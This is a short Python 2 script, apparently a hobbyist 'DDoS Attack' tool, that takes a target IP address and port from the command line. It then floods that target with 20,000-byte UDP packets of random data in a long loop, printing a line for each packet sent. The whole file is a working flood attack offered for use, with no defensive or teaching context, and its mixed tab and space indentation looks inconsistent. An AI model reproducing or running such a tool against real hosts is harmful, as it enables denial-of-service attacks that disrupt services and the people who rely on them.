import os , sys , time , socket , random

R = ("\033[31m"); W = ("\033[0m"); B = ("\033[34m"); Y = ("\033[33m");G = ("\033[32m")

def banner():
	print (G+"   ____     ___     __	      "+W+"|"+R+"    Ddos Attack")
	print (G+"  /  _/__  / _ \___/ /__  ___ "+W+"|")
	print (G+" _/ // _ \/ // / _  / _ \(_-< "+W+"|"+B+" [=] "+W+"author : Ci Ku")
	print (G+"/___/ .__/____/\_,_/\___/___/ "+W+"|"+B+" [=] "+W+"I LOVE YOU "+R+":*")
	print (G+"   /_/\n")

def run():
	banner()
        print (B+"[*] "+G+"prepairing")
        time.sleep(1)
        print (B+"[+] "+G+"DDOS ready...\n")

try:

	    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

	    ip = sys.argv[1]
	    por = sys.argv[2]
	    port = int(por)

	    if "." not in ip:
		banner()
	        print (B+"[+] "+Y+"Usage : "+G+"python2 "+sys.argv[0]+B+" <"+G+"ip target"+B+"> <"+G+"port"+B+">")
                print (B+"[-] "+W+"python2 "+sys.argv[0]+" 127.0.0.1 8080")
		exit()

	    else:
		pass


	    duration = 10000000
	    bytes = random._urandom(20000)
	    timeout = time.time() + duration
	    sent = 3000
	    run()

     	    while 1:
   	     if time.time() > timeout:
        	    break
      	     else:
   	         pass

             time.sleep(0.2)
             client.sendto(bytes, (ip,port))
             sent = sent + 1
             print (B+"[+] "+G+"send packets to "+R+ip+G+" port "+R+por+B+" Success >>")


except IndexError:
       	banner()
      	print (B+"[+] "+Y+"Usage : "+G+"python2 "+sys.argv[0]+B+" <"+G+"ip target"+B+"> <"+G+"port"+B+">")
        print (B+"     [-] "+W+"python2 "+sys.argv[0]+" 127.0.0.1 8080")
        exit()
